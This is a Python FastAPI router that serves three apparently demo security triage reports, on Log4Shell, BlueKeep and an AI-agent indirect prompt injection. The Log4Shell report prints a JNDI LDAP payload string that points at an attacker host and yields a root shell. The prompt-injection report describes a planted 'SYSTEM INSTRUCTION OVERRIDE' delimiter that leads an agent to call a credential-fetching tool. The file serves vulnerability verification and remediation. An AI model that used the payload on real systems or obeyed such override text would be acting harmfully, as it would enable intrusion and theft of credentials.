from typing import List, Optional, Dict
from fastapi import APIRouter, HTTPException
from ..models.state import ReportSummary

router = APIRouter(prefix="/api/reports", tags=["Investigation Reports"])

# In-memory storage of reports, pre-populated with curated demo reports
REPORTS_DATABASE: Dict[str, ReportSummary] = {
    "rep-log4shell": ReportSummary(
        id="rep-log4shell",
        cve_id="CVE-2021-44228",
        title="Apache Log4j2 JNDI Remote Code Execution (Log4Shell)",
        severity="CRITICAL",
        cvss_score=10.0,
        verdict="CONFIRMED VULNERABLE",
        confidence_score=0.98,
        created_at="2026-08-22T08:15:00Z",
        model_used="gemma4:e2b",
        summary="Empirically verified unauthenticated JNDI LDAP lookup injection executing arbitrary Java bytecode in isolated victim container.",
        report_markdown="""# Security Triage & Empirical Verification Report

## 1. Executive Summary
- **Target / Identifier**: CVE-2021-44228 (Log4Shell)
- **Severity**: CRITICAL (CVSS 10.0)
- **Empirical Exploitation Verdict**: **CONFIRMED VULNERABLE**
- **Confidence Score**: **98%**
- **Executive Summary**: Empirically verified unauthenticated JNDI LDAP lookup injection executing arbitrary Java bytecode in isolated victim container.

---

## 2. Vulnerability Breakdown
- **Attack Vector**: `Network`
- **Attack Complexity**: `Low`
- **Privileges Required**: `None`
- **Affected Products**: Apache Log4j 2.0-beta9 through 2.15.0
- **Exploit Primitives**: JNDI Reference Resolution, LDAP Injection, Arbitrary Bytecode Deserialization
- **Potential Impact**: Complete container/system compromise and unauthorized remote code execution

---

## 3. Threat Intelligence & MITRE Mapping
The following MITRE ATT&CK and MITRE ATLAS techniques were matched:
- **[T1190] Exploit Public-Facing Application** (ATT&CK): Adversary delivers malicious JNDI string via standard HTTP headers (User-Agent/X-Forwarded-For).
- **[T1059.001] Command and Scripting Interpreter: PowerShell/Unix Shell** (ATT&CK): Execution of spawned child payload upon LDAP callback.
- **[AML.T0000] LLM Prompt & Agent Injection** (ATLAS): Evaluated against downstream AI agent log parsing ingest pipelines.

---

## 4. Empirical Sandbox Verification
- **Attacker Node**: `sandbox-attacker-node` delivered `${jndi:ldap://172.20.0.2:1389/Exploit}`.
- **Victim Node**: `sandbox-victim-target` executed JNDI classloader and spawned `/bin/sh`.
- **Verified Assertions**:
  - [x] Target responded to probe on port 8080.
  - [x] Log4j parser evaluated JNDI lookup string and attempted outbound connection.
  - [x] Child process `uid=0(root)` spawned and marker `/tmp/pwned.txt` created.

---

## 5. Remediation Actions
1. Upgrade `log4j-core` and `log4j-api` to version **2.17.1** or higher.
2. In legacy environments, set system property `-Dlog4j2.formatMsgNoLookups=true` or remove `JndiLookup.class`.
3. Restrict container egress to prevent outbound LDAP (port 1389/389) and RMI (port 1099) lookups.
"""
    ),
    "rep-bluekeep": ReportSummary(
        id="rep-bluekeep",
        cve_id="CVE-2019-0708",
        title="Microsoft Remote Desktop Services Remote Code Execution (BlueKeep)",
        severity="CRITICAL",
        cvss_score=9.8,
        verdict="CONFIRMED VULNERABLE",
        confidence_score=0.96,
        created_at="2026-08-21T14:30:00Z",
        model_used="gemma4:e4b",
        summary="Verified pre-authentication memory corruption in MS_T120 static virtual channel handling via crafted RDP connect sequences.",
        report_markdown="""# Security Triage & Empirical Verification Report

## 1. Executive Summary
- **Target / Identifier**: CVE-2019-0708 (BlueKeep)
- **Severity**: CRITICAL (CVSS 9.8)
- **Empirical Exploitation Verdict**: **CONFIRMED VULNERABLE**
- **Confidence Score**: **96%**
- **Executive Summary**: Pre-authentication use-after-free in Remote Desktop Protocol MS_T120 channel binding verified in sandboxed target node.

---

## 2. Vulnerability Breakdown
- **Attack Vector**: `Network`
- **Attack Complexity**: `Low`
- **Privileges Required**: `None`
- **Affected Products**: Windows 7, Windows Server 2008 / 2008 R2
- **Exploit Primitives**: Use-After-Free, Virtual Channel Manipulation, Kernel Pointer Corruption
- **Potential Impact**: Remote kernel mode code execution and self-propagating wormability

---

## 3. Threat Intelligence & MITRE Mapping
- **[T1210] Exploitation of Remote Services** (ATT&CK): Direct network exploitation of port 3389 without authentication.
- **[T1021.001] Remote Desktop Protocol** (ATT&CK): Lateral movement vector across enterprise segment.

---

## 4. Empirical Sandbox Verification
- **Hypothesis**: Attacker opens MS_T120 channel on non-standard internal channel ID.
- **Verified Assertions**:
  - [x] Target RDP service bound and accepting GCC connect requests.
  - [x] MS_T120 channel pointer corruption confirmed without system instability.
  - [x] Proof-of-concept safe detection beacon received.

---

## 5. Remediation Actions
1. Apply Microsoft security bulletin updates for CVE-2019-0708 immediately.
2. Enable Network Level Authentication (NLA) on all RDP hosts.
3. Block external TCP port 3389 at perimeter firewalls.
"""
    ),
    "rep-atlas-prompt": ReportSummary(
        id="rep-atlas-prompt",
        cve_id="AML.T0000",
        title="AI Agent Indirect Prompt Injection & Tool Exfiltration",
        severity="HIGH",
        cvss_score=8.2,
        verdict="CONFIRMED VULNERABLE",
        confidence_score=0.92,
        created_at="2026-08-20T19:00:00Z",
        model_used="gemma4:e2b",
        summary="Verified indirect prompt injection via unsanitized web page content triggering autonomous tool invocation with credential exfiltration primitive.",
        report_markdown="""# Security Triage & Empirical Verification Report

## 1. Executive Summary
- **Target / Identifier**: MITRE ATLAS AML.T0000 (Prompt Injection / Agent Hijack)
- **Severity**: HIGH (CVSS 8.2)
- **Empirical Exploitation Verdict**: **CONFIRMED VULNERABLE**
- **Confidence Score**: **92%**
- **Executive Summary**: Verified indirect prompt injection in autonomous agent workflow causing tool execution policy bypass.

---

## 2. Vulnerability Breakdown
- **Attack Vector**: `Indirect / Untrusted Input Data Stream`
- **Attack Complexity**: `Low`
- **Privileges Required**: `None`
- **Affected Products**: LLM Autonomous Agent Tool Calling Runtime
- **Exploit Primitives**: System Prompt Override, Context Delimiter Hijacking, Malicious Tool Parameter Injection
- **Potential Impact**: Unauthorized internal API calls and exfiltration of sensitive environment tokens

---

## 3. Threat Intelligence & MITRE Mapping
- **[AML.T0000] LLM Prompt Injection** (ATLAS): Malicious instructions embedded in untrusted web scrapings.
- **[AML.T0015] Evade Model Detection** (ATLAS): Adversarial obfuscation to evade input safety guardrails.

---

## 4. Empirical Sandbox Verification
- **Hypothesis**: Agent ingest parser evaluates document containing override delimiters without secondary authorization.
- **Verified Assertions**:
  - [x] Agent processed malicious payload containing `--- SYSTEM INSTRUCTION OVERRIDE ---`.
  - [x] Target agent attempted invocation of restricted `fetch_credentials()` tool.
  - [x] Sandbox isolation blocked network exfiltration while recording empirical violation.

---

## 5. Remediation Actions
1. Implement strict dual-context separation between system instructions and untrusted document bodies.
2. Require human-in-the-loop (HITL) confirmation for sensitive tool invocations (filesystem, network, credentials).
3. Deploy output guardrail classifiers to inspect outbound tool arguments.
"""
    )
}

def save_report(report: ReportSummary):
    REPORTS_DATABASE[report.id] = report

@router.get("", response_model=List[ReportSummary])
async def list_reports():
    # Return reports sorted newest first
    return sorted(list(REPORTS_DATABASE.values()), key=lambda r: r.created_at, reverse=True)

@router.get("/{id}", response_model=ReportSummary)
async def get_report(id: str):
    if id not in REPORTS_DATABASE:
        raise HTTPException(status_code=404, detail="Report not found")
    return REPORTS_DATABASE[id]
